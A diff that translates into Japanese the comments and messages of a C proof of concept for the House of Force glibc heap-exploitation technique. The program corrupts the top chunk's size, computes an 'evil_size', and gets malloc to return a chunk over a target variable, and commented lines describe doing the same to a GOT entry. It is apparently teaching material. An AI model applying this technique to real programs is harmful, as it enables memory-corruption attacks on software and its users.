@@ -1,11 +1,11 @@
 /*
 
-   This PoC works also with ASLR enabled.
-   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
-   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum 
+   この PoC は ASLR が有効でも動作します。
+   GOT エントリを上書きするため、この手法をそのまま適用するには RELRO が無効である必要があります。
+   RELRO が有効な場合は、Malloc Des Maleficarum で提案されているように、スタック上のチャンクを返させる方法を試すこともできます。
    ( http://phrack.org/issues/66/10.html )
 
-   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04
+   Ubuntu 14.04(64ビット)、Ubuntu 18.04 でテスト済みです。
 
 */
 
@@ -22,42 +22,42 @@ char bss_var[] = "This is a string that we want to overwrite.";
 
 int main(int argc , char* argv[])
 {
-	fprintf(stderr, "\nWelcome to the House of Force\n\n");
-	fprintf(stderr, "The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n");
-	fprintf(stderr, "The top chunk is a special chunk. Is the last in memory "
-		"and is the chunk that will be resized when malloc asks for more space from the os.\n");
+	fprintf(stderr, "\nHouse of Force へようこそ\n\n");
+	fprintf(stderr, "House of Force の考え方は、top chunkを上書きして、malloc に任意の値を返させることです。\n");
+	fprintf(stderr, "top chunkは特別なチャンク(chunk)です。メモリ上で最後にあり、"
+		"malloc が OS にさらに領域を要求するときにサイズが変更されるチャンクです。\n");
 
-	fprintf(stderr, "\nIn the end, we will use this to overwrite a variable at %p.\n", bss_var);
-	fprintf(stderr, "Its current value is: %s\n", bss_var);
+	fprintf(stderr, "\n最終的に、これを使って %p にある変数を上書きします。\n", bss_var);
+	fprintf(stderr, "現在の値: %s\n", bss_var);
 
 
 
-	fprintf(stderr, "\nLet's allocate the first chunk, taking space from the wilderness.\n");
+	fprintf(stderr, "\n最初のチャンクを割り当てましょう。wildernessから領域を取ります。\n");
 	intptr_t *p1 = malloc(256);
-	fprintf(stderr, "The chunk of 256 bytes has been allocated at %p.\n", p1 - 2);
+	fprintf(stderr, "256 バイトのチャンクが %p に割り当てられました。\n", p1 - 2);
 
-	fprintf(stderr, "\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n");
+	fprintf(stderr, "\nこれで、ヒープは2つのチャンクで構成されています。割り当てたチャンクと、top chunk/wildernessです。\n");
 	int real_size = malloc_usable_size(p1);
-	fprintf(stderr, "Real size (aligned and all that jazz) of our allocated chunk is %ld.\n", real_size + sizeof(long)*2);
+	fprintf(stderr, "割り当てたチャンクの実際のサイズ(アラインメントなどを含む)は %ld です。\n", real_size + sizeof(long)*2);
 
-	fprintf(stderr, "\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");
+	fprintf(stderr, "\nでは、top chunkのヘッダを上書きできる脆弱性を再現しましょう\n");
 
 	//----- VULNERABILITY ----
 	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
-	fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top);
+	fprintf(stderr, "\ntop chunkは %p から始まります\n", ptr_top);
 
-	fprintf(stderr, "\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
-	fprintf(stderr, "Old size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
+	fprintf(stderr, "\ntop chunkのサイズを大きな値で上書きして、malloc が mmap を決して呼ばないようにします。\n");
+	fprintf(stderr, "top chunkの元のサイズ %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
 	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
-	fprintf(stderr, "New size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
+	fprintf(stderr, "top chunkの新しいサイズ %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
 	//------------------------
 
-	fprintf(stderr, "\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n"
-	   "Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"
-	   "overflow) and will then be able to allocate a chunk right over the desired region.\n");
+	fprintf(stderr, "\nwildernessのサイズは、これで巨大になりました。malloc() が mmap を呼ぶことなく、何でも割り当てられます。\n"
+	   "次に、目的の領域のすぐ手前まで到達するチャンクを(整数オーバーフローを使って)割り当てます。\n"
+	   "その後、目的の領域のちょうど上にチャンクを割り当てられるようになります。\n");
 
 	/*
-	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
+	 * evil_size は次のように計算します(nb は要求したバイト数 + メタデータ用の領域です):
 	 * new_top = old_top + nb
 	 * nb = new_top - old_top
 	 * req + 2sizeof(long) = new_top - old_top
@@ -66,35 +66,35 @@ int main(int argc , char* argv[])
 	 * req = dest - old_top - 4*sizeof(long)
 	 */
 	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
-	fprintf(stderr, "\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
-	   "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
+	fprintf(stderr, "\n書き込みたい値は %p にあり、top chunkは %p にあります。ヘッダのサイズを考慮して、\n"
+	   "%#lx バイトを malloc します。\n", bss_var, ptr_top, evil_size);
 	void *new_ptr = malloc(evil_size);
-	fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr - sizeof(long)*2);
+	fprintf(stderr, "予想どおり、新しいポインタは古いtop chunkと同じ場所にあります: %p\n", new_ptr - sizeof(long)*2);
 
 	void* ctr_chunk = malloc(100);
-	fprintf(stderr, "\nNow, the next chunk we overwrite will point at our target buffer.\n");
+	fprintf(stderr, "\nこれで、次に割り当てるチャンクは、標的のバッファを指します。\n");
 	fprintf(stderr, "malloc(100) => %p!\n", ctr_chunk);
-	fprintf(stderr, "Now, we can finally overwrite that value:\n");
+	fprintf(stderr, "これで、ようやくその値を上書きできます:\n");
 
-	fprintf(stderr, "... old string: %s\n", bss_var);
-	fprintf(stderr, "... doing strcpy overwrite with \"YEAH!!!\"...\n");
+	fprintf(stderr, "... 元の文字列: %s\n", bss_var);
+	fprintf(stderr, "... strcpy で \"YEAH!!!\" を上書きします...\n");
 	strcpy(ctr_chunk, "YEAH!!!");
-	fprintf(stderr, "... new string: %s\n", bss_var);
+	fprintf(stderr, "... 新しい文字列: %s\n", bss_var);
 
 	assert(ctr_chunk == bss_var);
 
 
-	// some further discussion:
-	//fprintf(stderr, "This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n");
-	//fprintf(stderr, "This because the main_arena->top pointer is setted to current av->top + malloc_size "
-	//	"and we \nwant to set this result to the address of malloc_got_address-8\n\n");
-	//fprintf(stderr, "In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n");
-	//fprintf(stderr, "The av->top after this big malloc will be setted in this way to malloc_got_address-8\n\n");
-	//fprintf(stderr, "After that a new call to malloc will return av->top+8 ( +8 bytes for the header ),"
-	//	"\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n");
+	// さらなる補足:
+	//fprintf(stderr, "この制御された malloc は、サイズ引数 evil_size = malloc_got_address - 8 - p2_guessed で呼び出されます\n\n");
+	//fprintf(stderr, "これは、main_arena->top ポインタが現在の av->top + malloc_size に設定され、"
+	//	"この結果を malloc_got_address-8 のアドレスに \nしたいからです\n\n");
+	//fprintf(stderr, "そのために、malloc_got_address-8 = p2_guessed + evil_size とします\n\n");
+	//fprintf(stderr, "この大きな malloc の後、av->top はこのように malloc_got_address-8 に設定されます\n\n");
+	//fprintf(stderr, "その後、malloc を新たに呼び出すと av->top+8 ( ヘッダ分の +8 バイト )が返され、"
+	//	"\n基本的に (malloc_got_address-8)+8 = malloc_got_address にあるチャンクが返されます\n\n");
 
-	//fprintf(stderr, "The large chunk with evil_size has been allocated here 0x%08x\n",p2);
-	//fprintf(stderr, "The main_arena value av->top has been setted to malloc_got_address-8=0x%08x\n",malloc_got_address);
+	//fprintf(stderr, "evil_size の大きなチャンクはここに割り当てられました 0x%08x\n",p2);
+	//fprintf(stderr, "main_arena の値 av->top は malloc_got_address-8=0x%08x に設定されました\n",malloc_got_address);
 
-	//fprintf(stderr, "This last malloc will be served from the remainder code and will return the av->top+8 injected before\n");
+	//fprintf(stderr, "この最後の malloc は remainder のコードから処理され、先に差し込んだ av->top+8 を返します\n");
 }
